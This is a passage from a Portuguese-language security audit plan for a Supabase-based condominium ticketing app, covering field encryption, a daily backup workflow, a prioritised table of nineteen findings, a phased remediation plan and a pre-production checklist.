-- Criptografar campos sensíveis (WhatsApp, nome do morador)
-- Usar pgcrypto

create extension pgcrypto;

alter table chamados
add column morador_nome_criptografado text;

update chamados
set morador_nome_criptografado = 
  pgp_sym_encrypt(morador_nome, 'chave-secreta-forte');

-- Depois remover coluna original
```

**Prioridade:** 🟡 MÉDIO

---

### #S19: Sem Backup & Disaster Recovery Policy - ALTO (Muito interessante, mas confirmar antes de executar e expor vantagens)

**Status Atual:**
```
Supabase free tier:
  - Backups automáticos: 7 dias (gratuito)
  - Retenção: Limitada
  - RTO/RPO: Não documentado
```

**Vulnerabilidade:**
- Se BD é deletada/corrompida, perda de dados permanente
- Sem plano de contingência

**Impacto:**
- 🔴 Perda de todos os dados de chamados
- 🔴 Impossível recuperar morador/admin contatos

**Recomendação:**

**Backup Manual Regular:**
```bash
# Script em GitHub Actions (cron daily)
# .github/workflows/backup-supabase.yml
name: Daily Backup

on:
  schedule:
    - cron: '0 2 * * *'  # 2 AM UTC

jobs:
  backup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Backup Supabase
        run: |
          npm install @supabase/supabase-js
          node scripts/backup.js
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
      - name: Upload to S3
        run: |
          aws s3 cp backup-$(date +%Y%m%d).sql.gz \
            s3://seu-bucket-backup/
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

**Script de Backup:**
```typescript
// scripts/backup.ts
import { createClient } from '@supabase/supabase-js';
import * as fs from 'fs';

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
);

async function backup() {
  // Exportar todas as tabelas
  const tabelas = ['chamados', 'usuarios', 'condominios', 'chamado_anexos'];
  
  for (const tabela of tabelas) {
    const { data, error } = await supabase.from(tabela).select('*');
    if (!error) {
      fs.writeFileSync(`backup/${tabela}.json`, JSON.stringify(data, null, 2));
    }
  }
  
  console.log('Backup concluído');
}

backup();
```

**Prioridade:** 🟠 ALTO

---

## 📊 RESUMO E PRIORIZAÇÃO

| # | Problema | Categoria | Severidade | Esforço | Status |
|---|----------|-----------|-----------|--------|--------|
| S1 | RLS Permissiva | Auth | 🔴 CRÍTICO | 4h | Ready (usar 0012) |
| S2 | Sem Rate Limiting Auth | Auth | 🔴 CRÍTICO | 8h | Não iniciado |
| S3 | Sem Email Verification | Auth | 🟠 ALTO | 2h | Supabase config |
| S4 | Sem Session Validation | Auth | 🟡 MÉDIO | 6h | Não iniciado |
| S5 | Sem MFA | Auth | 🟡 MÉDIO | 12h | Opcional |
| S6 | Sem Sanitização XSS | Injeção | 🔴 CRÍTICO | 12h | Não iniciado |
| S7 | SQL Injection Risk | Injeção | 🟠 ALTO | 4h | Mitigado (client) |
| S8 | Sem MIME Validation | Injeção | 🔴 CRÍTICO | 10h | Não iniciado |
| S9 | Sem CSP Headers | Injeção | 🟠 ALTO | 4h | Não iniciado |
| S10 | Sem HTTPS Enforcement | API | 🔴 CRÍTICO | 1h | Supabase config |
| S11 | Sem CORS Restritivo | API | 🟡 MÉDIO | 2h | Supabase config |
| S12 | Sem Rate Limit API | API | 🟠 ALTO | 8h | Não iniciado |
| S13 | Sem Audit Log | API | 🟡 MÉDIO | 10h | Não iniciado |
| S14 | Sem CSRF Token | API | 🟠 ALTO | 6h | Não iniciado |
| S15 | Secrets Expostas | Config | 🔴 CRÍTICO | 1h | Verificar |
| S16 | Sem Cert Pinning | Config | 🟢 BAIXO | 8h | Opcional |
| S17 | Sem Secrets Rotation | Config | 🟡 MÉDIO | 4h | Policy only |
| S18 | Sem Criptografia Repouso | Config | 🟡 MÉDIO | 8h | Upgrade plan |
| S19 | Sem Backup Policy | Config | 🟠 ALTO | 12h | Não iniciado |

---

## ⚡ PLANO DE IMPLEMENTAÇÃO RECOMENDADO

### **Fase 1: CRÍTICO (Semana 1-2)** 🔴
```
ANTES de qualquer usuário real acessar:

1. ✅ Aplicar RLS hardening (0012_hardening_rls_producao.sql) - 4h
2. ✅ Implementar Sanitização XSS (DOMPurify) - 12h
3. ✅ Adicionar MIME validation em uploads - 10h
4. ✅ Ativar HSTS headers no Vercel - 1h
5. ✅ Verificar secrets não estão no git - 1h
6. ✅ Rate limiting de auth (Supabase config) - 2h

Subtotal: ~30h = 1 dev, 1 semana
```

### **Fase 2: ALTO (Semana 3-4)** 🟠
```
1. Rate limiting de API (Redis + Edge Functions) - 8h
2. CSP headers - 4h
3. Email verification (Supabase config) - 2h
4. Session validation + heartbeat - 6h
5. CORS restritivo - 2h
6. CSRF token protection - 6h

Subtotal: ~28h = 1-2 devs, 2 semanas
```

### **Fase 3: MÉDIO (Semana 5-6)** 🟡
```
1. Audit logging (triggers + tabelas) - 10h
2. Session management improvements - 6h
3. MFA implementation (TOTP) - 12h
4. Secrets rotation policy - 4h
5. Backup automation (GitHub Actions) - 12h

Subtotal: ~44h = 2 devs, 2-3 semanas
```

---

## 📝 CHECKLIST DE VERIFICAÇÃO ANTES DE PRODUÇÃO

- [ ] Arquivo 0012_hardening_rls_producao.sql aplicado ao BD
- [ ] DOMPurify instalado e sanitizando TODOS os campos de texto livre
- [ ] MIME validation + magic bytes em uploads
- [ ] HSTS header ativado em vercel.json
- [ ] Nenhum arquivo .env commitado no git
- [ ] Rate limiting de login ativo (Supabase)
- [ ] Rate limiting de API implementado
- [ ] CSP headers configurados
- [ ] CORS restritivo em Supabase
- [ ] Email verification habilitado em Auth
- [ ] Session validation rodando a cada 5 minutos
- [ ] Audit logging registrando ações
- [ ] Backup automático diário
- [ ] Teste de segurança com OWASP ZAP
- [ ] Teste de penetration (opcional, mas recomendado)

---

## 🔗 REFERÊNCIAS E RECURSOS

### Documentação
- [Supabase RLS Best Practices](https://supabase.com/docs/guides/auth/row-level-security)
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

### Ferramentas de Teste
- OWASP ZAP (scanner de segurança gratuito)
- Burp Suite Community (análise de requisições)
- npm audit (dependências vulneráveis)
- Snyk (monitoramento de vulnerabilidades)

### Bibliotecas Recomendadas
```bash
npm install dompurify validator helmet
```

---

## 📞 PRÓXIMOS PASSOS

1. **Revisar** este documento com a equipe
2. **Priorizar** quais problemas atacar primeiro
3. **Alocar** recursos (dev, QA, segurança)
4. **Criar** tickets para cada problema (Jira/GitHub Issues)
5. **Testar** cada mitigação antes de deploy
6. **Validar** com teste de penetração (opcional)

---

**Documento preparado para análise.**  
**Nenhuma implementação foi feita.**  
**Aguardando aprovação e priorização.**
